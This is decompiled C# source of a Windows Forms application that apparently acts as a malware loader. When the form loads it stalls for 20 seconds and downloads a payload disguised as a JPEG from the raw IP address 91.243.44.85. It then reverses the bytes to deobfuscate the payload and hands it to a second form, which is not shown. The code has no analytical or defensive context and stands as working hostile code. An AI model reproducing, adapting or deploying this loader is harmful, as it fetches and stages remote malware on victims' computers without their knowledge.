using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace Vzhkt;

public class Form1 : Form
{
	internal byte[] Array;

	private IContainer components = null;

	private ListBox listBox1;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			byte[] b = Omqqbvx("http://91.243.44.85/Liteuphj_Wjgdsyror_Yerpsvgo.jpg");
			Array = Account(b);
			((Control)new Form2(Array)).Show();
			listBox1.get_Items().Add((object)DateTime.Now.ToString());
		}
		catch
		{
			((Form)this).Close();
		}
	}

	internal byte[] Omqqbvx(string url)
	{
		Stopwatch stopwatch = new Stopwatch();
		try
		{
			ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		}
		catch
		{
		}
		stopwatch.Start();
		while (stopwatch.Elapsed.TotalSeconds < 20.0)
		{
		}
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(new Uri(url));
		using MemoryStream memoryStream = new MemoryStream();
		using HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		using Stream stream = httpWebResponse.GetResponseStream();
		int count = 1024;
		byte[] buffer = new byte[1024];
		int num = 0;
		while ((num = stream.Read(buffer, 0, count)) != 0)
		{
			memoryStream.Write(buffer, 0, num);
		}
		stopwatch.Stop();
		return memoryStream.ToArray();
	}

	internal byte[] Account(byte[] b)
	{
		List<byte> list = new List<byte>();
		int num = b.Length;
		while (num-- > 0)
		{
			list.Add(b[num]);
		}
		return list.ToArray();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		listBox1 = new ListBox();
		((Control)this).SuspendLayout();
		((Control)listBox1).set_Dock((DockStyle)5);
		((ListControl)listBox1).set_FormattingEnabled(true);
		listBox1.set_ItemHeight(24);
		((Control)listBox1).set_Location(new Point(0, 0));
		((Control)listBox1).set_Name("listBox1");
		((Control)listBox1).set_Size(new Size(800, 450));
		((Control)listBox1).set_TabIndex(0);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(11f, 24f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).get_Controls().Add((Control)(object)listBox1);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
